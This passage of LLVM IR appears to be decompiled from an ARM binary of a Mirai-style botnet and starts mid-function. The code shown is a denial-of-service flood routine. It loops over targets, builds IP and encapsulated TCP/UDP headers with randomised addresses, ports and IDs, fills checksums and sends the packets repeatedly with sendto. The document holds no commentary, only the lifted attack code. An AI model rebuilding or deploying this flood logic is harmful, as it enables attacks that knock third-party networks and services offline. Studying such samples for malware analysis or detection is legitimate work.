  %v1_9744 = trunc i32 %v0_9744 to i8
  %v2_9744 = load i32, i32* @r5, align 4
  %v3_9744 = add i32 %v2_9744, 8
  %v4_9744 = inttoptr i32 %v3_9744 to i8*
  store i8 %v1_9744, i8* %v4_9744, align 1
  %v0_9748 = load i32, i32* %r3.global-to-local, align 4
  %v1_9748 = trunc i32 %v0_9748 to i8
  %v2_9748 = load i32, i32* @r5, align 4
  %v3_9748 = add i32 %v2_9748, 9
  %v4_9748 = inttoptr i32 %v3_9748 to i8*
  store i8 %v1_9748, i8* %v4_9748, align 1
  %v0_974c = call i32 @rand_next()
  store i32 %v0_974c, i32* %r0.global-to-local, align 4
  store i32 %v1_956c, i32* %r1.global-to-local, align 4
  store i1 %v2_9758, i1* %cpsr_z.global-to-local, align 1
  %v1_975c = sub i32 1023, %v0_974c
  store i32 %v1_975c, i32* %r3.global-to-local, align 4
  br i1 %v2_9758, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_9764 = load i32, i32* @r5, align 4
  %v3_9764 = add i32 %v2_9764, 16
  %v4_9764 = inttoptr i32 %v3_9764 to i32*
  store i32 %v1_975c, i32* %v4_9764, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_9760 = load i32, i32* %r4.global-to-local, align 4
  %v2_9760 = add i32 %v1_9760, 16
  %v3_9760 = inttoptr i32 %v2_9760 to i32*
  %v4_9760 = load i32, i32* %v3_9760, align 4
  store i32 %v4_9760, i32* %r3.global-to-local, align 4
  %v2_9768 = load i32, i32* @r5, align 4
  %v3_9768 = add i32 %v2_9768, 16
  %v4_9768 = inttoptr i32 %v3_9768 to i32*
  store i32 %v4_9760, i32* %v4_9768, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_976c = load i32, i32* @r5, align 4
  %v2_976c = add i32 %v1_976c, 12
  %v3_976c = inttoptr i32 %v2_976c to i32*
  store i32 %v0_974c, i32* %v3_976c, align 4
  %v3_9770 = load i32, i32* %stack_var_-44, align 4
  %v0_9774 = load i32, i32* %r4.global-to-local, align 4
  %v1_9774 = add i32 %v0_9774, 58
  store i32 %v1_9774, i32* @r6, align 4
  store i32 %v4_9778, i32* %r2.global-to-local, align 4
  %v1_977c = add i32 %v3_9770, 1
  store i32 %v1_977c, i32* @r4, align 4
  store i32 %v4_9780, i32* %r3.global-to-local, align 4
  %v1_9784 = load i32, i32* @sl, align 4
  %v9_9784 = icmp eq i32 %v1_977c, %v1_9784
  store i1 %v9_9784, i1* %cpsr_z.global-to-local, align 1
  %v0_9788 = load i32, i32* @r7, align 4
  %v1_9788 = trunc i32 %v0_9788 to i16
  %v3_9788 = add i32 %v0_9774, 62
  %v4_9788 = inttoptr i32 %v3_9788 to i16*
  store i16 %v1_9788, i16* %v4_9788, align 2
  %v0_978c = load i32, i32* %r2.global-to-local, align 4
  %v1_978c = trunc i32 %v0_978c to i16
  %v2_978c = load i32, i32* @r6, align 4
  %v3_978c = inttoptr i32 %v2_978c to i16*
  store i16 %v1_978c, i16* %v3_978c, align 2
  %v0_9790 = load i32, i32* %r3.global-to-local, align 4
  %v1_9790 = trunc i32 %v0_9790 to i16
  %v2_9790 = load i32, i32* @r6, align 4
  %v3_9790 = add i32 %v2_9790, 2
  %v4_9790 = inttoptr i32 %v3_9790 to i16*
  store i16 %v1_9790, i16* %v4_9790, align 2
  %v0_9794 = load i32, i32* @r4, align 4
  store i32 %v0_9794, i32* %stack_var_-44, align 4
  %v5_9798 = icmp slt i32 %v1_977c, %v1_9784
  br i1 %v5_9798, label %dec_label_pc_9640, label %dec_label_pc_979c

dec_label_pc_979c:                                ; preds = %bb85
  %v1_97a4 = add i32 %v5_94c0, 8
  store i32 %v1_97a4, i32* %r4.global-to-local, align 4
  %v1_97a8 = add i32 %v5_94c0, 66
  store i32 %v1_97a8, i32* %r5.global-to-local, align 4
  %v0_97b8.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_97b4.preheader

dec_label_pc_97b4.preheader:                      ; preds = %dec_label_pc_979c, %dec_label_pc_9a4c
  %v0_97b8.pre = phi i32 [ %v0_97b8.pre.pre, %dec_label_pc_979c ], [ 0, %dec_label_pc_9a4c ]
  %stack_var_-132.0.ph = phi i32 [ %v1_97a8, %dec_label_pc_979c ], [ %v1_9a58, %dec_label_pc_9a4c ]
  %stack_var_-136.0.ph = phi i32 [ %v1_97a4, %dec_label_pc_979c ], [ %v1_9a54, %dec_label_pc_9a4c ]
  %v2_9a08 = icmp eq i32 %v1_956c, 0
  %v2_9850 = ptrtoint i32* %stack_var_-48 to i32
  %v2_9868 = ptrtoint i32* %stack_var_-52 to i32
  %v2_9878 = ptrtoint i32* %stack_var_-56 to i32
  %v2_9884 = ptrtoint i32* %stack_var_-54 to i32
  %v2_9898 = icmp eq i32 %v1_94e0, 0
  %v2_97f8 = icmp eq i32 %v5_9514, -1
  %v7_97f8 = icmp eq i32 %v5_9514, -1
  br label %dec_label_pc_97b4

dec_label_pc_97b4:                                ; preds = %dec_label_pc_97b4, %dec_label_pc_98a0, %dec_label_pc_97b4.preheader
  %v0_97b8 = phi i32 [ %v0_97b8.pre, %dec_label_pc_97b4.preheader ], [ 0, %dec_label_pc_97b4 ], [ %v1_993c, %dec_label_pc_98a0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_97b8 = icmp eq i32 %v0_97b8, 0
  store i1 %v2_97b8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_97b8, label %dec_label_pc_97b4, label %dec_label_pc_97c4

dec_label_pc_97c4:                                ; preds = %dec_label_pc_97b4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_97c8

dec_label_pc_97c8:                                ; preds = %dec_label_pc_98a0, %dec_label_pc_97c4
  %v1_97dc = phi i32 [ %v1_9938, %dec_label_pc_98a0 ], [ 0, %dec_label_pc_97c4 ]
  %v5_97cc = mul i32 %v1_97dc, 24
  %v1_97d0 = load i32, i32* @sb, align 4
  %v2_97d0 = add i32 %v1_97d0, %v5_97cc
  store i32 %v2_97d0, i32* %r3.global-to-local, align 4
  store i32 %v2_93f4, i32* %r4.global-to-local, align 4
  %v1_97d8 = add i32 %v2_97d0, 20
  %v2_97d8 = inttoptr i32 %v1_97d8 to i8*
  %v3_97d8 = load i8, i8* %v2_97d8, align 1
  %v4_97d8 = zext i8 %v3_97d8 to i32
  store i32 %v4_97d8, i32* %r2.global-to-local, align 4
  %v4_97dc = mul i32 %v1_97dc, 4
  %v5_97dc = add i32 %v4_97dc, %v2_93f4
  %v6_97dc = inttoptr i32 %v5_97dc to i32*
  %v7_97dc = load i32, i32* %v6_97dc, align 4
  store i32 %v7_97dc, i32* @r5, align 4
  %v7_97e0 = icmp eq i8 %v3_97d8, 31
  store i1 %v7_97e0, i1* %cpsr_z.global-to-local, align 1
  %v1_97e4 = add i32 %v7_97dc, 24
  store i32 %v1_97e4, i32* @r7, align 4
  %v1_97e8 = add i32 %v7_97dc, 38
  store i32 %v1_97e8, i32* @r6, align 4
  %v1_97ec = add i32 %v7_97dc, 58
  store i32 %v1_97ec, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_97d8, 32
  br i1 %tmp90, label %dec_label_pc_994c, label %dec_label_pc_97f4

dec_label_pc_97f4:                                ; preds = %dec_label_pc_97c8
  store i32 %v5_9514, i32* %r1.global-to-local, align 4
  store i1 %v7_97f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97f8, label %dec_label_pc_99ac, label %dec_label_pc_9800

dec_label_pc_9800:                                ; preds = %dec_label_pc_994c, %dec_label_pc_97f4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9808 = load i32, i32* @fp, align 4
  %v9_9808 = icmp eq i32 %v0_9808, 65535
  store i1 %v9_9808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9808, label %dec_label_pc_99c4, label %dec_label_pc_9810

dec_label_pc_9810:                                ; preds = %dec_label_pc_99ac.dec_label_pc_9810_crit_edge, %dec_label_pc_9800
  %v1_9814 = phi i32 [ %v1_9814.pre, %dec_label_pc_99ac.dec_label_pc_9810_crit_edge ], [ 65535, %dec_label_pc_9800 ]
  store i32 %v3_9574, i32* %r2.global-to-local, align 4
  %v9_9814 = icmp eq i32 %v3_9574, %v1_9814
  store i1 %v9_9814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9814, label %dec_label_pc_99ec, label %dec_label_pc_981c

dec_label_pc_981c:                                ; preds = %dec_label_pc_99c4.dec_label_pc_981c_crit_edge, %dec_label_pc_9810
  %v1_9820 = phi i32 [ %v1_9820.pre, %dec_label_pc_99c4.dec_label_pc_981c_crit_edge ], [ %v1_9814, %dec_label_pc_9810 ]
  store i32 %v3_9578, i32* %r3.global-to-local, align 4
  %v9_9820 = icmp eq i32 %v3_9578, %v1_9820
  store i1 %v9_9820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9820, label %dec_label_pc_9a00, label %dec_label_pc_9828

dec_label_pc_9828:                                ; preds = %dec_label_pc_99ec, %dec_label_pc_981c
  store i32 %v1_956c, i32* @r4, align 4
  store i1 %v2_9a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a08, label %dec_label_pc_9a1c, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_9828
  %v1_9830 = load i32, i32* @r5, align 4
  %v2_9830 = add i32 %v1_9830, 16
  %v3_9830 = inttoptr i32 %v2_9830 to i32*
  %v4_9830 = load i32, i32* %v3_9830, align 4
  store i32 %v4_9830, i32* %r3.global-to-local, align 4
  %v2_9834 = load i32, i32* @r6, align 4
  %v3_9834 = add i32 %v2_9834, 16
  %v4_9834 = inttoptr i32 %v3_9834 to i32*
  store i32 %v4_9830, i32* %v4_9834, align 4
  br label %dec_label_pc_983c

dec_label_pc_983c:                                ; preds = %bb88, %.thread11, %dec_label_pc_9a1c
  %v0_983c = call i32 @rand_next()
  store i32 %v0_983c, i32* %r0.global-to-local, align 4
  store i32 %v0_983c, i32* %stack_var_-48, align 4
  %v0_9844 = call i32 @rand_next()
  store i32 %v0_9844, i32* %r0.global-to-local, align 4
  store i32 %v0_9844, i32* %stack_var_-52, align 4
  %v0_984c = call i32 @rand_next()
  store i32 %v2_9850, i32* %r1.global-to-local, align 4
  store i32 %v0_984c, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_985c = load i32, i32* @r7, align 4
  store i32 %v0_985c, i32* %r0.global-to-local, align 4
  %v3_9860 = call i32 @util_memcpy(i32 %v0_985c, i32 %v2_9850, i32 4)
  %v0_9864 = load i32, i32* @r7, align 4
  %v1_9864 = add i32 %v0_9864, 6
  store i32 %v1_9864, i32* %r0.global-to-local, align 4
  store i32 %v2_9868, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_9870 = call i32 @util_memcpy(i32 %v1_9864, i32 %v2_9868, i32 4)
  %v0_9874 = load i32, i32* @r7, align 4
  %v1_9874 = add i32 %v0_9874, 4
  store i32 %v1_9874, i32* %r0.global-to-local, align 4
  store i32 %v2_9878, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9880 = call i32 @util_memcpy(i32 %v1_9874, i32 %v2_9878, i32 2)
  store i32 %v2_9884, i32* %r1.global-to-local, align 4
  %v0_9888 = load i32, i32* @r7, align 4
  %v1_9888 = add i32 %v0_9888, 10
  store i32 %v1_9888, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9890 = call i32 @util_memcpy(i32 %v1_9888, i32 %v2_9884, i32 2)
  store i32 %v3_9890, i32* %r0.global-to-local, align 4
  store i32 %v1_94e0, i32* %r1.global-to-local, align 4
  store i1 %v2_9898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9898, label %dec_label_pc_98a0, label %dec_label_pc_9a28

dec_label_pc_98a0:                                ; preds = %dec_label_pc_983c, %dec_label_pc_9a28
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_98a4 = load i32, i32* @r5, align 4
  %v3_98a4 = add i32 %v2_98a4, 10
  %v4_98a4 = inttoptr i32 %v3_98a4 to i16*
  store i16 0, i16* %v4_98a4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_98ac = load i32, i32* @r5, align 4
  store i32 %v0_98ac, i32* @r0, align 4
  %v2_98b0 = call i32 @checksum_generic(i32 %v0_98ac, i32 20)
  %v3_98b0 = trunc i32 %v2_98b0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_98b8 = load i32, i32* @r5, align 4
  %v4_98b8 = add i32 %v3_98b8, 10
  %v5_98b8 = inttoptr i32 %v4_98b8 to i16*
  store i16 %v3_98b0, i16* %v5_98b8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_98c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_98c0 = trunc i32 %v0_98c0 to i16
  %v2_98c0 = load i32, i32* @r6, align 4
  %v3_98c0 = add i32 %v2_98c0, 10
  %v4_98c0 = inttoptr i32 %v3_98c0 to i16*
  store i16 %v1_98c0, i16* %v4_98c0, align 2
  %v0_98c4 = load i32, i32* @r6, align 4
  store i32 %v0_98c4, i32* @r0, align 4
  %v2_98c8 = call i32 @checksum_generic(i32 %v0_98c4, i32 20)
  %v3_98c8 = trunc i32 %v2_98c8 to i16
  store i32 %v2_98c8, i32* %r0.global-to-local, align 4
  %v3_98cc = load i32, i32* @r6, align 4
  %v4_98cc = add i32 %v3_98cc, 10
  %v5_98cc = inttoptr i32 %v4_98cc to i16*
  store i16 %v3_98c8, i16* %v5_98cc, align 2
  store i32 0, i32* @r4, align 4
  %v0_98d4 = load i32, i32* @r8, align 4
  store i32 %v0_98d4, i32* @r1, align 4
  %v1_98d8 = add i32 %v0_98d4, 4
  %v2_98d8 = inttoptr i32 %v1_98d8 to i16*
  %v3_98d8 = load i16, i16* %v2_98d8, align 2
  %v4_98d8 = zext i16 %v3_98d8 to i32
  store i32 %v4_98d8, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_98e0 = add i32 %v0_98d4, 6
  %v4_98e0 = inttoptr i32 %v3_98e0 to i16*
  store i16 0, i16* %v4_98e0, align 2
  %v0_98e4 = load i32, i32* @r6, align 4
  store i32 %v0_98e4, i32* %r0.global-to-local, align 4
  %v4_98e8 = call i32 @checksum_tcpudp(i32 %v0_98e4, i32 %v0_98d4, i32 %v4_98d8, i32 %stack_var_-136.0.ph)
  %v5_98e8 = trunc i32 %v4_98e8 to i16
  store i32 %v4_98e8, i32* %r0.global-to-local, align 4
  %v3_98ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98ec, i32* %r2.global-to-local, align 4
  %v3_98f0 = mul i32 %v3_98ec, 32
  store i32 %v3_98f0, i32* %r3.global-to-local, align 4
  %v0_98f4 = load i32, i32* @r5, align 4
  %v1_98f4 = add i32 %v0_98f4, 16
  %v2_98f4 = inttoptr i32 %v1_98f4 to i32*
  %v3_98f4 = load i32, i32* %v2_98f4, align 4
  %v5_98f8 = mul i32 %v3_98ec, 24
  store i32 %v5_98f8, i32* %r3.global-to-local, align 4
  %v1_98fc = load i32, i32* @sb, align 4
  %v2_98fc = add i32 %v1_98fc, %v5_98f8
  store i32 %v2_98fc, i32* @lr, align 4
  %v2_9900 = add i32 %v2_98fc, 4
  %v3_9900 = inttoptr i32 %v2_9900 to i32*
  store i32 %v3_98f4, i32* %v3_9900, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9908 = load i32, i32* @r8, align 4
  %v4_9908 = add i32 %v3_9908, 6
  %v5_9908 = inttoptr i32 %v4_9908 to i16*
  store i16 %v5_98e8, i16* %v5_9908, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9910 = load i32, i32* %r1.global-to-local, align 4
  %v1_9910 = trunc i32 %v0_9910 to i16
  %v2_9910 = load i32, i32* %r3.global-to-local, align 4
  %v3_9910 = load i32, i32* @sb, align 4
  %v4_9910 = add i32 %v3_9910, %v2_9910
  %v5_9910 = inttoptr i32 %v4_9910 to i16*
  store i16 %v1_9910, i16* %v5_9910, align 2
  %v0_9914 = load i32, i32* @r4, align 4
  %v1_9914 = trunc i32 %v0_9914 to i16
  %v2_9914 = load i32, i32* @lr, align 4
  %v3_9914 = add i32 %v2_9914, 2
  %v4_9914 = inttoptr i32 %v3_9914 to i16*
  store i16 %v1_9914, i16* %v4_9914, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_991c = load i32, i32* @r5, align 4
  store i32 %v0_991c, i32* %r1.global-to-local, align 4
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_9928 = load i32, i32* @lr, align 4
  %v0_992c = load i32, i32* %ip.global-to-local, align 4
  %v6_9930 = call i32 @__libc_sendto(i32 %v3_9528, i32 %v0_991c, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_9928, i32 %v0_992c)
  %v3_9934 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9934, i32* %r3.global-to-local, align 4
  %v1_9938 = add i32 %v3_9934, 1
  store i32 %v1_9938, i32* %r0.global-to-local, align 4
  %v1_993c = load i32, i32* @sl, align 4
  %v9_993c = icmp eq i32 %v1_9938, %v1_993c
  store i1 %v9_993c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9938, i32* %stack_var_-44, align 4
  %v6_9944 = icmp slt i32 %v1_9938, %v1_993c
  br i1 %v6_9944, label %dec_label_pc_97c8, label %dec_label_pc_97b4

dec_label_pc_994c:                                ; preds = %dec_label_pc_97c8
  %v1_994c = add i32 %v2_97d0, 16
  %v2_994c = inttoptr i32 %v1_994c to i32*
  %v3_994c = load i32, i32* %v2_994c, align 4
  store i32 %v3_994c, i32* %r4.global-to-local, align 4
  %v0_9950 = call i32 @rand_next()
  store i32 %v0_9950, i32* %r0.global-to-local, align 4
  %v3_9954 = load i32, i32* %stack_var_-44, align 4
  %v5_995c = mul i32 %v3_9954, 24
  %v0_9960 = load i32, i32* %r4.global-to-local, align 4
  %v1_9960 = and i32 %v0_9960, 16711680
  store i32 %v1_9960, i32* %ip.global-to-local, align 4
  %v3_9964 = udiv i32 %v0_9960, 16777216
  %v4_9968 = udiv i32 %v1_9960, 256
  %v5_9968 = or i32 %v4_9968, %v3_9964
  store i32 %v5_9968, i32* %r2.global-to-local, align 4
  %v1_996c = load i32, i32* @sb, align 4
  %v2_996c = add i32 %v1_996c, %v5_995c
  store i32 %v2_996c, i32* %r1.global-to-local, align 4
  %v1_9970 = and i32 %v0_9960, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_9970, i32* %r3.global-to-local, align 4
  %v1_9974 = add i32 %v2_996c, 20
  %v2_9974 = inttoptr i32 %v1_9974 to i8*
  %v3_9974 = load i8, i8* %v2_9974, align 1
  %v4_9974 = zext i8 %v3_9974 to i32
  store i32 %v4_9974, i32* %ip.global-to-local, align 4
  %v4_9978 = mul i32 %v1_9970, 256
  %v4_997c = mul i32 %v0_9960, 16777216
  %v5_9978 = or i32 %v4_9978, %v4_997c
  %v5_997c = or i32 %v5_9978, %v5_9968
  %v7_9980 = lshr i32 %v0_9950, %v4_9974
  %v8_9980 = add i32 %v7_9980, %v5_997c
  store i32 %v8_9980, i32* %r2.global-to-local, align 4
  %v1_9984 = and i32 %v8_9980, 16711680
  store i32 %v1_9984, i32* %r0.global-to-local, align 4
  store i32 %v5_9514, i32* %r1.global-to-local, align 4
  %v5_999c = call i32 @llvm.bswap.i32(i32 %v8_9980)
  store i32 %v5_999c, i32* %r3.global-to-local, align 4
  store i1 %v7_97f8, i1* %cpsr_z.global-to-local, align 1
  %v1_99a4 = load i32, i32* @r5, align 4
  %v2_99a4 = add i32 %v1_99a4, 16
  %v3_99a4 = inttoptr i32 %v2_99a4 to i32*
  store i32 %v5_999c, i32* %v3_99a4, align 4
  br i1 %v2_97f8, label %dec_label_pc_99ac, label %dec_label_pc_9800

dec_label_pc_99ac:                                ; preds = %dec_label_pc_994c, %dec_label_pc_97f4
  %v0_99ac = call i32 @rand_next()
  store i32 %v0_99ac, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_99b8 = load i32, i32* @fp, align 4
  %v9_99b8 = icmp eq i32 %v0_99b8, 65535
  store i1 %v9_99b8, i1* %cpsr_z.global-to-local, align 1
  %v1_99bc = load i32, i32* @r5, align 4
  %v2_99bc = add i32 %v1_99bc, 12
  %v3_99bc = inttoptr i32 %v2_99bc to i32*
  store i32 %v0_99ac, i32* %v3_99bc, align 4
  br i1 %v9_99b8, label %dec_label_pc_99c4, label %dec_label_pc_99ac.dec_label_pc_9810_crit_edge

dec_label_pc_99ac.dec_label_pc_9810_crit_edge:    ; preds = %dec_label_pc_99ac
  %v1_9814.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9810

dec_label_pc_99c4:                                ; preds = %dec_label_pc_99ac, %dec_label_pc_9800
  %v0_99c4 = call i32 @rand_next()
  %v3_99cc = urem i32 %v0_99c4, 65536
  store i32 %v3_99cc, i32* %r0.global-to-local, align 4
  store i32 %v3_9574, i32* %r2.global-to-local, align 4
  %v1_99d8 = sub nsw i32 999, %v3_99cc
  store i32 %v1_99d8, i32* %r3.global-to-local, align 4
  %v1_99dc = load i32, i32* %r4.global-to-local, align 4
  %v9_99dc = icmp eq i32 %v3_9574, %v1_99dc
  store i1 %v9_99dc, i1* %cpsr_z.global-to-local, align 1
  %v1_99e0 = trunc i32 %v0_99c4 to i16
  %v2_99e0 = load i32, i32* @r5, align 4
  %v3_99e0 = add i32 %v2_99e0, 4
  %v4_99e0 = inttoptr i32 %v3_99e0 to i16*
  store i16 %v1_99e0, i16* %v4_99e0, align 2
  %v0_99e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_99e4 = trunc i32 %v0_99e4 to i16
  %v2_99e4 = load i32, i32* @r6, align 4
  %v3_99e4 = add i32 %v2_99e4, 4
  %v4_99e4 = inttoptr i32 %v3_99e4 to i16*
  store i16 %v1_99e4, i16* %v4_99e4, align 2
  br i1 %v9_99dc, label %dec_label_pc_99ec, label %dec_label_pc_99c4.dec_label_pc_981c_crit_edge

dec_label_pc_99c4.dec_label_pc_981c_crit_edge:    ; preds = %dec_label_pc_99c4
  %v1_9820.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_981c

dec_label_pc_99ec:                                ; preds = %dec_label_pc_99c4, %dec_label_pc_9810
  %v0_99ec = call i32 @rand_next()
  %v1_99ec = trunc i32 %v0_99ec to i16
  store i32 %v0_99ec, i32* %r0.global-to-local, align 4
  store i32 %v3_9578, i32* %r3.global-to-local, align 4
  %v1_99f4 = load i32, i32* %r4.global-to-local, align 4
  %v9_99f4 = icmp eq i32 %v3_9578, %v1_99f4
  store i1 %v9_99f4, i1* %cpsr_z.global-to-local, align 1
  %v3_99f8 = load i32, i32* @r5, align 4
  %v4_99f8 = add i32 %v3_99f8, 58
  %v5_99f8 = inttoptr i32 %v4_99f8 to i16*
  store i16 %v1_99ec, i16* %v5_99f8, align 2
  br i1 %v9_99f4, label %dec_label_pc_9a00, label %dec_label_pc_9828

dec_label_pc_9a00:                                ; preds = %dec_label_pc_99ec, %dec_label_pc_981c
  %v0_9a00 = call i32 @rand_next()
  %v1_9a00 = trunc i32 %v0_9a00 to i16
  store i32 %v0_9a00, i32* %r0.global-to-local, align 4
  store i32 %v1_956c, i32* @r4, align 4
  store i1 %v2_9a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a08, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_9a00
  %v3_9a1032 = load i32, i32* @r8, align 4
  %v4_9a1033 = add i32 %v3_9a1032, 2
  %v5_9a1034 = inttoptr i32 %v4_9a1033 to i16*
  store i16 %v1_9a00, i16* %v5_9a1034, align 2
  br label %dec_label_pc_9a1c

bb88:                                             ; preds = %dec_label_pc_9a00
  %v1_9a0c = load i32, i32* @r5, align 4
  %v2_9a0c = add i32 %v1_9a0c, 16
  %v3_9a0c = inttoptr i32 %v2_9a0c to i32*
  %v4_9a0c = load i32, i32* %v3_9a0c, align 4
  store i32 %v4_9a0c, i32* %r3.global-to-local, align 4
  %v3_9a10 = load i32, i32* @r8, align 4
  %v4_9a10 = add i32 %v3_9a10, 2
  %v5_9a10 = inttoptr i32 %v4_9a10 to i16*
  store i16 %v1_9a00, i16* %v5_9a10, align 2
  %v1_9a14 = load i32, i32* %r3.global-to-local, align 4
  %v2_9a14 = load i32, i32* @r6, align 4
  %v3_9a14 = add i32 %v2_9a14, 16
  %v4_9a14 = inttoptr i32 %v3_9a14 to i32*
  store i32 %v1_9a14, i32* %v4_9a14, align 4
  br label %dec_label_pc_983c

dec_label_pc_9a1c:                                ; preds = %.thread31, %dec_label_pc_9828
  %v0_9a1c = call i32 @rand_next()
  store i32 %v0_9a1c, i32* %r0.global-to-local, align 4
  %v1_9a20 = load i32, i32* @r6, align 4
  %v2_9a20 = add i32 %v1_9a20, 16
  %v3_9a20 = inttoptr i32 %v2_9a20 to i32*
  store i32 %v0_9a1c, i32* %v3_9a20, align 4
  br label %dec_label_pc_983c

dec_label_pc_9a28:                                ; preds = %dec_label_pc_983c
  %v0_9a28 = load i32, i32* @r8, align 4
  %v1_9a28 = add i32 %v0_9a28, 8
  store i32 %v1_9a28, i32* %r0.global-to-local, align 4
  store i32 %v5_94c0, i32* %r1.global-to-local, align 4
  %v2_9a30 = inttoptr i32 %v1_9a28 to i16*
  %v3_9a30 = call i32 @rand_str(i16* %v2_9a30, i32 %v5_94c0)
  store i32 %v3_9a30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98a0

dec_label_pc_9a38:                                ; preds = %dec_label_pc_9538
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  %v1_9a3c = call i32 @__GI___libc_close(i32 %v3_9528)
  store i32 %v1_9a3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a40

dec_label_pc_9a40:                                ; preds = %entry, %dec_label_pc_9a38
  %v1_9a48 = phi i32 [ %v3_9528, %entry ], [ %v1_9a3c, %dec_label_pc_9a38 ]
  store i32 %v3_93d8, i32* %r4.global-to-local, align 4
  store i32 %v6_93d8, i32* %r5.global-to-local, align 4
  store i32 %v24_93d8, i32* %fp.global-to-local, align 4
  ret i32 %v1_9a48

dec_label_pc_9a4c:                                ; preds = %dec_label_pc_9560
  %v1_9a54 = add i32 %v5_94c0, 8
  store i32 %v1_9a54, i32* %r1.global-to-local, align 4
  %v1_9a58 = add i32 %v5_94c0, 66
  store i32 %v1_9a58, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_97b4.preheader

; uselistorder directives
  uselistorder i32 %v1_9a58, { 1, 0 }
  uselistorder i32 %v1_9a54, { 1, 0 }
  uselistorder i16 %v1_9a00, { 1, 0 }
  uselistorder i32 %v0_9a00, { 1, 0 }
  uselistorder i32 %v0_99ec, { 1, 0 }
  uselistorder i32 %v3_99cc, { 1, 0 }
  uselistorder i32 %v0_99c4, { 1, 0 }
  uselistorder i32 %v5_999c, { 1, 0 }
  uselistorder i32 %v0_9960, { 0, 2, 1, 3 }
  uselistorder i32 %v1_993c, { 1, 2, 0 }
  uselistorder i32 %v1_9938, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_98ec, { 1, 0, 2 }
  uselistorder i32 %v4_98e8, { 1, 0 }
  uselistorder i32 %v0_98d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_98c8, { 1, 0 }
  uselistorder i32 %v7_97dc, { 2, 1, 0, 3 }
  uselistorder i1 %v7_97f8, { 2, 1, 0 }
  uselistorder i1 %v2_9a08, { 2, 3, 1, 0 }
  uselistorder i32 %v0_974c, { 1, 0, 2 }
  uselistorder i32 %v3_95c8, { 1, 0 }
  uselistorder i32 %v3_95ac, { 1, 2, 0 }
  uselistorder i32 %v1_95a8, { 1, 0 }
  uselistorder i32 %v1_956c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9568, { 1, 0, 3, 2 }
  uselistorder i32 %v0_9564, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9560, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9558, { 1, 0 }
  uselistorder i1 %v7_952c, { 1, 0 }
  uselistorder i32 %v3_9528, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_9514, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_94e0, { 1, 2, 0 }
  uselistorder i32 %v5_94c0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_9474, { 1, 0 }
  uselistorder i32 %v1_9450, { 2, 1, 0 }
  uselistorder i32 %v5_9448, { 1, 0 }
  uselistorder i8 %v5_942c, { 0, 2, 1 }
  uselistorder i32 %v6_940c, { 1, 0 }
  uselistorder i32 %v2_93f4, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 1, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0 }
